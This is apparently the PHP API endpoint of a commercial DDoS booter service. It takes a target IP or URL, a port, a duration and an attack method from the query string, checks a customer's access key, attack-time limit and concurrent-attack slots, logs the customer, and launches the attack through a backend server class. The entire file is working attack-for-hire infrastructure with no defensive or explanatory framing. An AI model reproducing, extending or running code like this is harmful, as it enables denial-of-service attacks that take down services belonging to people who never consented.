<?php
session_start();
set_time_limit(0);
ignore_user_abort(0);
error_reporting(0);
require 'global.php';

/* Attack Based variables */
$ip = $_GET['ip'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
$key = $_GET['key'];
$admin = Config::Read('MAIN_ACCOUNT');
$customer = $_GET['customer'];


/* Back-End related Variables */
$server = new server();
$user = new user();
$data = $user->returnData($admin);
$logs = new logger();

/* Smart Layer Detection */
$methodData = $server->getMethod($method);

if(!isset($ip) || !isset($port) || !isset($time) || !isset($method) || !isset($key) || !isset($customer))
{
    die('ERROR: Please fill in all fields');
    
}
elseif(!filter_var($ip, FILTER_VALIDATE_IP) && $methodData['classification'] == 4)
{
    die('ERROR: This is not a valid IP');
    
}
elseif(!filter_var($ip, FILTER_VALIDATE_URL) && $methodData['classification'] == 7)
{
    die('ERROR: This is not a valid layer 7 URL');
}
elseif(!is_numeric($port) || !is_numeric($time))
{
    die('ERROR: Numeric Port / Time values only');
}
elseif(!$server->allowedMethod($method))
{
    die('ERROR: This is not a valid method');
}
elseif($time > $data['max_time'])
{
    die('ERROR: You are exceeding your max boottime!');
}
elseif($key != $data['accesskey'])
{
    die(Config::Read('DENYMSG'));
}
elseif(!$user->freeSlot($admin))
{
    die('ERROR: You have the maximum amount of concurrent attacks running');
}
else
{
    print 'Attack has been sent on ' . htmlspecialchars($ip) . ':' . htmlspecialchars($port) . ' for ' . $time . ' seconds using ' . $method;
    $logs->insertLog($customer, $ip, $port, $time, $method);
    $server->sendAttack($ip, $port, $time, $method);
}
?>

